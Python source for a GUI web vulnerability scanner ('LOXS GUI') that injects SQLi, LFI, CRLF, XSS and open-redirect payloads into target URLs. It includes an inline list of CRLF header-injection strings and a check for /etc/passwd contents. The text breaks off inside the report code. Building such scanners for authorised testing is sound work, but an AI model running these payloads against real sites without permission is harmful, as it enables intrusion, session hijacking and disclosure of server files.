from __future__ import annotations

import argparse
import html
import os
import queue
import random
import re
import threading
import time
import tkinter as tk
import urllib.parse
import webbrowser
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from tkinter import filedialog, messagebox, scrolledtext, ttk
from urllib.parse import parse_qs, urlencode, urlsplit, urlunsplit

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from selenium import webdriver
    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import WebDriverWait
    from webdriver_manager.chrome import ChromeDriverManager
except Exception:
    webdriver = None
    TimeoutException = Exception
    UnexpectedAlertPresentException = Exception
    Options = None
    Service = None
    WebDriverWait = None
    EC = None
    ChromeDriverManager = None


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

APP_DIR = Path(__file__).resolve().parent

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
]

SCANNERS = ["SQLi", "LFI", "CRLF", "XSS", "Open Redirect"]

DEFAULT_PAYLOADS = {
    "SQLi": APP_DIR / "payloads" / "sqli" / "generic.txt",
    "LFI": APP_DIR / "payloads" / "lfi.txt",
    "XSS": APP_DIR / "payloads" / "xss.txt",
    "Open Redirect": APP_DIR / "payloads" / "or.txt",
}

DEFAULT_URLS = {
    "SQLi": "https://target.example/page.php?id=1",
    "LFI": "https://target.example/view.php?file=",
    "CRLF": "https://target.example/",
    "XSS": "https://target.example/search.php?q=1",
    "Open Redirect": "https://target.example/redirect.php?next=local",
}

CRLF_REGEX_PATTERNS = [
    r"(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))",
    r"(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))",
]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


def headers_with_cookie(cookie: str | None = None) -> dict[str, str]:
    headers = {"User-Agent": random_user_agent()}
    if cookie:
        headers["Cookie"] = cookie
    return headers


def retry_session() -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, read=2, connect=2, backoff_factor=0.2, status_forcelist=(500, 502, 504))
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session


def load_payload_file(path: str) -> list[str]:
    payload_path = Path(path)
    if not payload_path.is_file():
        raise FileNotFoundError(f"Payload file not found: {path}")
    return [line.strip() for line in payload_path.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()]


def normalize_url(url: str) -> str:
    value = url.strip()
    if not value:
        return value
    parsed = urllib.parse.urlparse(value)
    if not parsed.scheme:
        return "http://" + value
    return value


def parse_cookie_string(cookie_string: str | None) -> list[dict[str, str]]:
    if not cookie_string:
        return []

    cookies: list[dict[str, str]] = []
    for part in cookie_string.split(";"):
        if "=" not in part:
            continue
        name, value = part.split("=", 1)
        name = name.strip()
        value = value.strip()
        if name:
            cookies.append({"name": name, "value": value})
    return cookies


def build_chrome_options(profile_dir: str | None = None) -> Options:
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-browser-side-navigation")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-notifications")
    chrome_options.page_load_strategy = "eager"
    if profile_dir:
        chrome_options.add_argument(f"--user-data-dir={profile_dir}")
    return chrome_options


def create_driver(profile_dir: str | None = None):
    if webdriver is None:
        raise RuntimeError("Selenium dependencies are not available.")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=build_chrome_options(profile_dir))
    driver.set_page_load_timeout(20)
    return driver


def inject_cookies(driver, url: str, cookie_string: str | None) -> None:
    cookies = parse_cookie_string(cookie_string)
    if not cookies:
        return

    scheme, netloc, _, _, _ = urlsplit(url)
    if not scheme:
        scheme = "http"
    base_url = urlunsplit((scheme, netloc, "/", "", ""))

    driver.get(base_url)
    driver.delete_all_cookies()
    for cookie in cookies:
        try:
            driver.add_cookie(cookie)
        except Exception:
            pass


def generate_xss_payload_urls(url: str, payload: str) -> list[str]:
    url_combinations: list[str] = []
    scheme, netloc, path, query_string, fragment = urlsplit(url)
    if not scheme:
        scheme = "http"

    query_params = parse_qs(query_string, keep_blank_values=True)
    for key in query_params:
        modified_params = query_params.copy()
        modified_params[key] = [payload]
        modified_query_string = urlencode(modified_params, doseq=True)
        url_combinations.append(urlunsplit((scheme, netloc, path, modified_query_string, fragment)))

    if fragment:
        if "=" in fragment:
            fragment_params = parse_qs(fragment, keep_blank_values=True)
            for key in fragment_params:
                modified_fragment_params = fragment_params.copy()
                modified_fragment_params[key] = [payload]
                modified_fragment_string = urlencode(modified_fragment_params, doseq=True)
                url_combinations.append(urlunsplit((scheme, netloc, path, query_string, modified_fragment_string)))
        else:
            url_combinations.append(urlunsplit((scheme, netloc, path, query_string, payload)))

    if not query_params and not fragment:
        url_combinations.append(urlunsplit((scheme, netloc, path, urlencode({"test": payload}), fragment)))
        url_combinations.append(urlunsplit((scheme, netloc, path, query_string, payload)))

    return url_combinations


def generate_crlf_payloads(url: str) -> list[str]:
    domain = urllib.parse.urlparse(url).netloc
    base_payloads = [
        "/%%0a0aSet-Cookie:loxs=injected",
        "/%0aSet-Cookie:loxs=injected;",
        "/%0aSet-Cookie:loxs=injected",
        "/%0d%0aLocation: http://loxs.pages.dev",
        "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
        "/%0d%0aSet-Cookie:loxs=injected;",
        "/%23%0aSet-Cookie:loxs=injected",
        "/%25%30%61Set-Cookie:loxs=injected",
        "/%5Cr%20Set-Cookie:loxs=injected;",
        "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
        "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
        "/%u000ASet-Cookie:loxs=injected;",
        "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
    ]
    return [payload.replace("{{Hostname}}", domain) for payload in base_payloads]


class ScannerEngine:
    def __init__(self, log, result, stop_event: threading.Event):
        self.log = log
        self.result = result
        self.stop_event = stop_event

    def run(
        self,
        scanner: str,
        urls: list[str],
        payloads: list[str],
        cookie: str | None,
        threads: int,
        timeout: float,
        success_criteria: list[str],
        chrome_profile: str | None,
    ) -> None:
        urls = [normalize_url(url) for url in urls if url.strip()]
        start = time.time()
        self.log(f"{scanner} scan started. URLs: {len(urls)}")

        if scanner == "SQLi":
            self.scan_sqli(urls, payloads, cookie, threads, timeout)
        elif scanner == "LFI":
            self.scan_lfi(urls, payloads, cookie, threads, timeout, success_criteria)
        elif scanner == "CRLF":
            self.scan_crlf(urls, cookie, threads, timeout)
        elif scanner == "XSS":
            self.scan_xss(urls, payloads, cookie, timeout, chrome_profile)
        elif scanner == "Open Redirect":
            self.scan_open_redirect(urls, payloads, cookie, timeout, chrome_profile)

        self.log(f"{scanner} scan finished in {time.time() - start:.1f}s.")

    def scan_sqli(self, urls: list[str], payloads: list[str], cookie: str | None, threads: int, timeout: float) -> None:
        def check(url: str, payload: str):
            target = f"{url}{payload}"
            start = time.time()
            try:
                response = requests.get(target, headers=headers_with_cookie(cookie), timeout=max(timeout, 15))
                response.raise_for_status()
                elapsed = time.time() - start
                vulnerable = elapsed >= 10
                return target, vulnerable, f"{elapsed:.2f}s"
            except requests.RequestException as exc:
                return target, False, str(exc)

        self._run_threaded("SQLi", urls, payloads, threads, check)

    def scan_lfi(
        self,
        urls: list[str],
        payloads: list[str],
        cookie: str | None,
        threads: int,
        timeout: float,
        success_criteria: list[str],
    ) -> None:
        def check(url: str, payload: str):
            target = f"{url}{urllib.parse.quote(payload.strip())}"
            start = time.time()
            try:
                response = requests.get(target, headers=headers_with_cookie(cookie), timeout=timeout)
                elapsed = time.time() - start
                vulnerable = response.status_code == 200 and any(re.search(pattern, response.text) for pattern in success_criteria)
                return target, vulnerable, f"{response.status_code} / {elapsed:.2f}s"
            except requests.RequestException as exc:
                return target, False, str(exc)

        self._run_threaded("LFI", urls, payloads, threads, check)

    def scan_crlf(self, urls: list[str], cookie: str | None, threads: int, timeout: float) -> None:
        session = retry_session()

        def check(url: str, payload: str):
            target = f"{url}{payload}"
            start = time.time()
            try:
                headers = headers_with_cookie(cookie)
                headers.update({"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Connection": "close"})
                response = session.get(target, headers=headers, allow_redirects=False, verify=False, timeout=timeout)
                elapsed = time.time() - start
                header_text = "\n".join(f"{key}: {value}" for key, value in response.headers.items())
                vulnerable = any(re.search(pattern, header_text, re.IGNORECASE) for pattern in CRLF_REGEX_PATTERNS)
                vulnerable = vulnerable or any(re.search(pattern, response.text, re.IGNORECASE) for pattern in CRLF_REGEX_PATTERNS)
                return target, vulnerable, f"{response.status_code} / {elapsed:.2f}s"
            except requests.RequestException as exc:
                return target, False, str(exc)

        work_items = [(url, payload) for url in urls for payload in generate_crlf_payloads(url)]
        self._run_threaded_items("CRLF", work_items, threads, check)

    def scan_xss(
        self,
        urls: list[str],
        payloads: list[str],
        cookie: str | None,
        timeout: float,
        chrome_profile: str | None,
    ) -> None:
        driver = create_driver(chrome_profile)
        try:
            for url in urls:
                for payload in payloads:
                    if self.stop_event.is_set():
                        return
                    for payload_url in generate_xss_payload_urls(url, payload):
                        if self.stop_event.is_set():
                            return
                        try:
                            inject_cookies(driver, payload_url, cookie)
                            driver.get(payload_url)
                            alert = WebDriverWait(driver, timeout).until(EC.alert_is_present())
                            alert_text = alert.text
                            alert.accept()
                            self.result("XSS", True, payload_url, f"Alert: {alert_text}")
                        except TimeoutException:
                            self.result("XSS", False, payload_url, "No alert")
                        except UnexpectedAlertPresentException:
                            self.result("XSS", True, payload_url, "Unexpected alert")
                        except Exception as exc:
                            self.result("XSS", False, payload_url, str(exc))
        finally:
            driver.quit()

    def scan_open_redirect(
        self,
        urls: list[str],
        payloads: list[str],
        cookie: str | None,
        timeout: float,
        chrome_profile: str | None,
    ) -> None:
        driver = create_driver(chrome_profile)
        try:
            for url in urls:
                parsed = urllib.parse.urlparse(url)
                if not parsed.scheme:
                    parsed = urllib.parse.urlparse("http://" + url)

                test_urls: list[str] = []
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                if query_params:
                    for payload in payloads:
                        for param in query_params:
                            modified = query_params.copy()
                            modified[param] = [payload]
                            test_urls.append(urllib.parse.urlunparse(parsed._replace(query=urlencode(modified, doseq=True))))
                else:
                    for payload in payloads:
                        test_urls.append(urllib.parse.urlunparse(parsed._replace(path=parsed.path + payload)))

                for test_url in test_urls:
                    if self.stop_event.is_set():
                        return
                    try:
                        inject_cookies(driver, test_url, cookie)
                        driver.get(test_url)
                        WebDriverWait(driver, timeout).until(lambda current: current.execute_script("return document.readyState") == "complete")
                        current_url = driver.current_url.lower()
                        original_host = urllib.parse.urlparse(url).netloc.lower()
                        current_host = urllib.parse.urlparse(current_url).netloc.lower()
                        vulnerable = bool(current_host and current_host != original_host)
                        self.result("Open Redirect", vulnerable, test_url, f"Final URL: {driver.current_url}")
                    except Exception as exc:
                        self.result("Open Redirect", False, test_url, str(exc))
        finally:
            driver.quit()

    def _run_threaded(self, scanner: str, urls: list[str], payloads: list[str], threads: int, check) -> None:
        work_items = [(url, payload) for url in urls for payload in payloads]
        self._run_threaded_items(scanner, work_items, threads, check)

    def _run_threaded_items(self, scanner: str, work_items: list[tuple[str, str]], threads: int, check) -> None:
        with ThreadPoolExecutor(max_workers=max(1, threads)) as executor:
            futures = [executor.submit(check, url, payload) for url, payload in work_items]
            for future in as_completed(futures):
                if self.stop_event.is_set():
                    return
                target, vulnerable, details = future.result()
                self.result(scanner, vulnerable, target, details)


class LoxsGui(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("LOXS GUI - Auth Scanner")
        self.geometry("1120x760")
        self.minsize(980, 640)
        self.configure(bg="#0f172a")

        self.events: queue.Queue[tuple[str, object]] = queue.Queue()
        self.stop_event = threading.Event()
        self.worker: threading.Thread | None = None
        self._last_url_template = DEFAULT_URLS["SQLi"]
        self.result_rows: list[dict[str, object]] = []
        self.scan_started_at: datetime | None = None
        self.active_scanner = "SQLi"

        self.scanner_var = tk.StringVar(value="SQLi")
        self.payload_path_var = tk.StringVar()
        self.cookie_var = tk.StringVar()
        self.threads_var = tk.IntVar(value=5)
        self.timeout_var = tk.DoubleVar(value=15.0)
        self.criteria_var = tk.StringVar(value="root:x:0:")
        self.profile_var = tk.StringVar()
        self.status_var = tk.StringVar(value="Ready")

        self._configure_style()
        self._configure_window_chrome()
        self._build_ui()
        self._set_default_payload()
        self.after(120, self._drain_events)

    def _configure_window_chrome(self) -> None:
        if os.name != "nt":
            return

        try:
            import ctypes
            from ctypes import byref, c_int

            self.update_idletasks()
            hwnd = ctypes.windll.user32.GetParent(self.winfo_id()) or self.winfo_id()
            enabled = c_int(1)

            for attribute in (20, 19):
                ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, attribute, byref(enabled), ctypes.sizeof(enabled))

            def colorref(hex_color: str) -> int:
                hex_color = hex_color.lstrip("#")
                red = int(hex_color[0:2], 16)
                green = int(hex_color[2:4], 16)
                blue = int(hex_color[4:6], 16)
                return red | (green << 8) | (blue << 16)

            caption = c_int(colorref("#0f172a"))
            text = c_int(colorref("#e5e7eb"))
            border = c_int(colorref("#334155"))

            ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 35, byref(caption), ctypes.sizeof(caption))
            ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 36, byref(text), ctypes.sizeof(text))
            ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 34, byref(border), ctypes.sizeof(border))
        except Exception:
            pass

    def _configure_style(self) -> None:
        self.colors = {
            "bg": "#0f172a",
            "panel": "#111827",
            "panel_2": "#172033",
            "field": "#0b1220",
            "text": "#e5e7eb",
            "muted": "#94a3b8",
            "border": "#334155",
            "accent": "#38bdf8",
            "danger": "#f87171",
            "success": "#34d399",
            "warning": "#fbbf24",
        }

        self.option_add("*TCombobox*Listbox.background", self.colors["field"])
        self.option_add("*TCombobox*Listbox.foreground", self.colors["text"])
        self.option_add("*TCombobox*Listbox.selectBackground", "#075985")
        self.option_add("*TCombobox*Listbox.selectForeground", "#e0f2fe")
        self.option_add("*TCombobox*Listbox.borderWidth", 0)

        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure(".", background=self.colors["bg"], foreground=self.colors["text"], font=("Segoe UI", 10))
        style.configure("TFrame", background=self.colors["bg"])
        style.configure("Panel.TFrame", background=self.colors["panel"])
        style.configure("TLabel", background=self.colors["bg"], foreground=self.colors["text"])
        style.configure("Muted.TLabel", background=self.colors["bg"], foreground=self.colors["muted"])
        style.configure("TLabelframe", background=self.colors["bg"], bordercolor=self.colors["border"], relief="solid")
        style.configure("TLabelframe.Label", background=self.colors["bg"], foreground=self.colors["accent"], font=("Segoe UI Semibold", 10))
        style.configure("TButton", background=self.colors["panel_2"], foreground=self.colors["text"], bordercolor=self.colors["border"], focusthickness=0, padding=(12, 7))
        style.map("TButton", background=[("active", "#1e293b"), ("disabled", "#111827")], foreground=[("disabled", "#64748b")])
        style.configure("Accent.TButton", background=self.colors["accent"], foreground="#06111f", bordercolor=self.colors["accent"])
        style.map("Accent.TButton", background=[("active", "#7dd3fc"), ("disabled", "#155e75")])
        style.configure("Danger.TButton", background="#7f1d1d", foreground="#fee2e2", bordercolor="#991b1b")
        style.map("Danger.TButton", background=[("active", "#991b1b"), ("disabled", "#311010")])
        style.configure("TEntry", fieldbackground=self.colors["field"], foreground=self.colors["text"], insertcolor=self.colors["text"], bordercolor=self.colors["border"])
        style.configure("TSpinbox", fieldbackground=self.colors["field"], foreground=self.colors["text"], insertcolor=self.colors["text"], bordercolor=self.colors["border"])
        style.configure(
            "TCombobox",
            fieldbackground=self.colors["field"],
            background=self.colors["panel_2"],
            foreground=self.colors["text"],
            arrowcolor=self.colors["text"],
            bordercolor=self.colors["border"],
            lightcolor=self.colors["border"],
            darkcolor=self.colors["border"],
            selectbackground="#075985",
            selectforeground="#e0f2fe",
        )
        style.map(
            "TCombobox",
            fieldbackground=[("readonly", self.colors["field"]), ("focus", self.colors["field"])],
            foreground=[("readonly", self.colors["text"]), ("focus", self.colors["text"])],
            background=[("active", "#1e293b"), ("readonly", self.colors["panel_2"])],
            arrowcolor=[("active", self.colors["accent"]), ("readonly", self.colors["text"])],
        )
        style.configure("Treeview", background=self.colors["field"], fieldbackground=self.colors["field"], foreground=self.colors["text"], bordercolor=self.colors["border"], rowheight=27)
        style.configure("Treeview.Heading", background=self.colors["panel_2"], foreground=self.colors["text"], bordercolor=self.colors["border"], font=("Segoe UI Semibold", 10))
        style.map("Treeview", background=[("selected", "#075985")], foreground=[("selected", "#e0f2fe")])
        style.configure("Vertical.TScrollbar", background=self.colors["panel_2"], troughcolor=self.colors["field"], bordercolor=self.colors["border"], arrowcolor=self.colors["text"])

    def _build_ui(self) -> None:
        self.columnconfigure(0, weight=1)
        self.rowconfigure(2, weight=1)

        top = ttk.LabelFrame(self, text="Scan Controls", padding=10)
        top.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 8))
        for column in range(8):
            top.columnconfigure(column, weight=1 if column in (1, 4) else 0)

        ttk.Label(top, text="Scanner").grid(row=0, column=0, sticky="w")
        scanner_combo = ttk.Combobox(top, textvariable=self.scanner_var, values=SCANNERS, state="readonly", width=18)
        scanner_combo.grid(row=0, column=1, sticky="w", padx=(8, 18))
        scanner_combo.bind("<<ComboboxSelected>>", lambda _event: self._on_scanner_changed())

        ttk.Label(top, text="Threads").grid(row=0, column=2, sticky="w")
        ttk.Spinbox(top, textvariable=self.threads_var, from_=1, to=20, width=6).grid(row=0, column=3, sticky="w", padx=(8, 18))

        ttk.Label(top, text="Timeout").grid(row=0, column=4, sticky="e")
        ttk.Spinbox(top, textvariable=self.timeout_var, from_=0.5, to=60.0, increment=0.5, width=7).grid(row=0, column=5, sticky="w", padx=(8, 18))

        self.start_button = ttk.Button(top, text="Start", command=self.start_scan, style="Accent.TButton")
        self.start_button.grid(row=0, column=6, padx=(0, 8))
        self.stop_button = ttk.Button(top, text="Stop", command=self.stop_scan, state="disabled", style="Danger.TButton")
        self.stop_button.grid(row=0, column=7)

        form = ttk.LabelFrame(self, text="Target And Authentication", padding=10)
        form.grid(row=1, column=0, sticky="ew", padx=10, pady=(0, 8))
        form.columnconfigure(1, weight=1)

        ttk.Label(form, text="URLs").grid(row=0, column=0, sticky="nw", pady=(0, 6))
        url_box_frame = ttk.Frame(form)
        url_box_frame.grid(row=0, column=1, sticky="ew", pady=(0, 6))
        url_box_frame.columnconfigure(0, weight=1)
        self.urls_text = tk.Text(
            url_box_frame,
            height=4,
            wrap="none",
            bg=self.colors["field"],
            fg=self.colors["text"],
            insertbackground=self.colors["text"],
            selectbackground="#075985",
            selectforeground="#e0f2fe",
            relief="flat",
            highlightthickness=1,
            highlightbackground=self.colors["border"],
            highlightcolor=self.colors["accent"],
        )
        self.urls_text.grid(row=0, column=0, sticky="ew")
        self.urls_text.insert("1.0", self._last_url_template)
        ttk.Button(url_box_frame, text="Load URLs", command=self.load_urls).grid(row=0, column=1, padx=(8, 0), sticky="n")

        self.payload_label = ttk.Label(form, text="Payload file")
        self.payload_label.grid(row=1, column=0, sticky="w", pady=3)
        self.payload_frame = ttk.Frame(form)
        self.payload_frame.grid(row=1, column=1, sticky="ew", pady=3)
        self.payload_frame.columnconfigure(0, weight=1)
        self.payload_entry = ttk.Entry(self.payload_frame, textvariable=self.payload_path_var)
        self.payload_entry.grid(row=0, column=0, sticky="ew")
        ttk.Button(self.payload_frame, text="Browse", command=self.browse_payload).grid(row=0, column=1, padx=(8, 0))

        ttk.Label(form, text="Cookie").grid(row=2, column=0, sticky="w", pady=3)
        ttk.Entry(form, textvariable=self.cookie_var).grid(row=2, column=1, sticky="ew", pady=3)

        self.criteria_label = ttk.Label(form, text="LFI criteria")
        self.criteria_label.grid(row=3, column=0, sticky="w", pady=3)
        self.criteria_entry = ttk.Entry(form, textvariable=self.criteria_var)
        self.criteria_entry.grid(row=3, column=1, sticky="ew", pady=3)

        self.profile_label = ttk.Label(form, text="Chrome profile")
        self.profile_label.grid(row=4, column=0, sticky="w", pady=3)
        self.profile_frame = ttk.Frame(form)
        self.profile_frame.grid(row=4, column=1, sticky="ew", pady=3)
        self.profile_frame.columnconfigure(0, weight=1)
        ttk.Entry(self.profile_frame, textvariable=self.profile_var).grid(row=0, column=0, sticky="ew")
        ttk.Button(self.profile_frame, text="Browse", command=self.browse_profile).grid(row=0, column=1, padx=(8, 0))

        body = ttk.PanedWindow(self, orient="vertical")
        body.grid(row=2, column=0, sticky="nsew", padx=10, pady=(0, 8))

        results_frame = ttk.Frame(body)
        results_frame.rowconfigure(0, weight=1)
        results_frame.columnconfigure(0, weight=1)
        self.results = ttk.Treeview(results_frame, columns=("scanner", "status", "url", "details"), show="headings", height=11)
        self.results.heading("scanner", text="Scanner")
        self.results.heading("status", text="Status")
        self.results.heading("url", text="URL")
        self.results.heading("details", text="Details")
        self.results.column("scanner", width=110, stretch=False)
        self.results.column("status", width=110, stretch=False)
        self.results.column("url", width=520)
        self.results.column("details", width=340)
        self.results.tag_configure("vulnerable", foreground=self.colors["success"])
        self.results.tag_configure("clean", foreground=self.colors["muted"])
        self.results.tag_configure("error", foreground=self.colors["danger"])
        self.results.grid(row=0, column=0, sticky="nsew")
        results_scroll = ttk.Scrollbar(results_frame, orient="vertical", command=self.results.yview)
        results_scroll.grid(row=0, column=1, sticky="ns")
        self.results.configure(yscrollcommand=results_scroll.set)
        body.add(results_frame, weight=3)

        log_frame = ttk.Frame(body)
        log_frame.rowconfigure(0, weight=1)
        log_frame.columnconfigure(0, weight=1)
        self.log_text = scrolledtext.ScrolledText(
            log_frame,
            height=9,
            wrap="word",
            state="disabled",
            bg=self.colors["field"],
            fg=self.colors["text"],
            insertbackground=self.colors["text"],
            selectbackground="#075985",
            selectforeground="#e0f2fe",
            relief="flat",
            highlightthickness=1,
            highlightbackground=self.colors["border"],
            highlightcolor=self.colors["accent"],
        )
        self.log_text.grid(row=0, column=0, sticky="nsew")
        body.add(log_frame, weight=2)

        bottom = ttk.Frame(self, padding=(10, 0, 10, 10))
        bottom.grid(row=3, column=0, sticky="ew")
        bottom.columnconfigure(0, weight=1)
        ttk.Label(bottom, textvariable=self.status_var).grid(row=0, column=0, sticky="w")
        ttk.Button(bottom, text="Clear", command=self.clear_output).grid(row=0, column=1, padx=(8, 0))
        ttk.Button(bottom, text="Save Log", command=self.save_log).grid(row=0, column=2, padx=(8, 0))
        self.report_button = ttk.Button(bottom, text="Export Report", command=self.export_report, state="disabled", style="Accent.TButton")
        self.report_button.grid(row=0, column=3, padx=(8, 0))

    def _set_default_payload(self) -> None:
        scanner = self.scanner_var.get()
        default = DEFAULT_PAYLOADS.get(scanner)
        if default:
            self.payload_path_var.set(str(default))
            self.payload_entry.configure(state="normal")
        else:
            self.payload_path_var.set("")
            self.payload_entry.configure(state="disabled")
        self._update_context_controls()

    def _on_scanner_changed(self) -> None:
        current_urls = self.urls_text.get("1.0", "end").strip()
        next_template = DEFAULT_URLS.get(self.scanner_var.get(), "")
        if not current_urls or current_urls == self._last_url_template:
            self.urls_text.delete("1.0", "end")
            self.urls_text.insert("1.0", next_template)
        self._last_url_template = next_template
        self._set_default_payload()

    def _update_context_controls(self) -> None:
        scanner = self.scanner_var.get()

        if scanner == "CRLF":
            self.payload_label.grid_remove()
            self.payload_frame.grid_remove()
        else:
            self.payload_label.grid()
            self.payload_frame.grid()

        if scanner == "LFI":
            self.criteria_label.grid()
            self.criteria_entry.grid()
        else:
            self.criteria_label.grid_remove()
            self.criteria_entry.grid_remove()

        if scanner in {"XSS", "Open Redirect"}:
            self.profile_label.grid()
            self.profile_frame.grid()
        else:
            self.profile_label.grid_remove()
            self.profile_frame.grid_remove()

        visible_hint = {
            "SQLi": "Time-based SQLi mode. Cookie is sent as an HTTP header.",
            "LFI": "LFI mode. Success criteria is active for this scanner.",
            "CRLF": "CRLF mode. Built-in payloads are used.",
            "XSS": "XSS mode. Selenium injects cookies before payload navigation.",
            "Open Redirect": "Open Redirect mode. Selenium follows the final URL.",
        }
        self.status_var.set(visible_hint.get(scanner, "Ready"))

    def load_urls(self) -> None:
        path = filedialog.askopenfilename(title="Select URL file", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not path:
            return
        content = Path(path).read_text(encoding="utf-8", errors="ignore")
        self.urls_text.delete("1.0", "end")
        self.urls_text.insert("1.0", content)

    def browse_payload(self) -> None:
        path = filedialog.askopenfilename(title="Select payload file", filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if path:
            self.payload_path_var.set(path)

    def browse_profile(self) -> None:
        path = filedialog.askdirectory(title="Select Chrome profile directory")
        if path:
            self.profile_var.set(path)

    def clear_output(self) -> None:
        for item in self.results.get_children():
            self.results.delete(item)
        self.result_rows.clear()
        self.report_button.configure(state="disabled")
        self.log_text.configure(state="normal")
        self.log_text.delete("1.0", "end")
        self.log_text.configure(state="disabled")

    def save_log(self) -> None:
        path = filedialog.asksaveasfilename(title="Save log", defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if not path:
            return
        rows = []
        for item in self.results.get_children():
            rows.append("\t".join(self.results.item(item, "values")))
        log = self.log_text.get("1.0", "end")
        Path(path).write_text("\n".join(rows) + "\n\n" + log, encoding="utf-8")

    def export_report(self) -> None:
        if not self.result_rows:
            messagebox.showinfo("LOXS GUI", "No scan results to export yet.")
            return

        default_name = f"loxs_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        path = filedialog.asksaveasfilename(
            title="Export HTML report",
            initialfile=default_name,
            defaultextension=".html",
            filetypes=[("HTML report", "*.html"), ("All files", "*.*")],
        )
        if not path:
            return

        report_path = Path(path)
        report_path.write_text(self._build_html_report(), encoding="utf-8")
        self._append_log(f"Report exported: {report_path}")

        if messagebox.askyesno("LOXS GUI", "Report exported. Open it now?"):
            webbrowser.open(report_path.resolve().as_uri())

    def _build_html_report(self) -> str:
        rows = list(self.result_rows)
        vulnerable_rows = [row for row in rows if row["vulnerable"]]
        scanners = sorted({str(row["scanner"]) for row in rows})
        started = self.scan_started_at.strftime("%Y-%m-%d %H:%M:%S") if self.scan_started_at else "N/A"
        generated = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        def esc(value: object) -> str:
            return html.escape(str(value), quote=True)

        def link(url: object) -> str:
            value = str(url)
            escaped = esc(value)
            return f'<a href="{escaped}" target="_blank" rel="noopener noreferrer">{escaped}</a>'

        def site_for(url: object) -> str:
            parsed = urllib.parse.urlparse(str(url))
            return parsed.netloc or str(url).split("/")[0]

        def finding_key(row: dict[str, object]) -> tuple[str, str, str]:
            parsed = urllib.parse.urlparse(str(row["url"]))
            scanner = str(row["scanner"])
            site = parsed.netloc or str(row["url"]).split("/")[0]
            query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params = ",".join(sorted(query)) if query else "(path)"
            endpoint = parsed.path or "/"
            return scanner, site, f"{endpoint} :: {params}"

        grouped_findings: dict[tuple[str, str, str], dict[str, object]] = {}
        for row in vulnerable_rows:
            key = finding_key(row)
            finding = grouped_findings.setdefault(
                key,
                {
                    "scanner": key[0],
                    "site": key[1],
                    "target": key[2],
                    "example_url": row["url"],
                    "payloads": [],
                },
            )
            finding["payloads"].append(row)

        site_summary: dict[str, dict[str, object]] = {}
        for finding in grouped_findings.values():
            site = str(finding["site"])
            scanner = str(finding["scanner"])
            summary = site_summary.setdefault(site, {"total": 0, "scanners": {}})
            summary["total"] = int(summary["total"]) + 1
            scanner_counts = summary["scanners"]
            scanner_counts[scanner] = int(scanner_counts.get(scanner, 0)) + 1

        site_summary_html = "\n".join(
            f"""
            <tr>
              <td>{esc(site)}</td>
              <td class="vulnerable-count">{summary["total"]}</td>
              <td>{esc(', '.join(f'{scanner}: {count}' for scanner, count in sorted(summary["scanners"].items())))}</td>
            </tr>
            """
            for site, summary in sorted(site_summary.items())
        )
        if not site_summary_html:
            site_summary_html = '<tr><td colspan="3" class="empty">No vulnerable sites found.</td></tr>'

        grouped_findings_html_parts = []
        for finding in sorted(grouped_findings.values(), key=lambda item: (str(item["site"]), str(item["scanner"]), str(item["target"]))):
            payload_rows = "\n".join(
                f"""
                <tr>
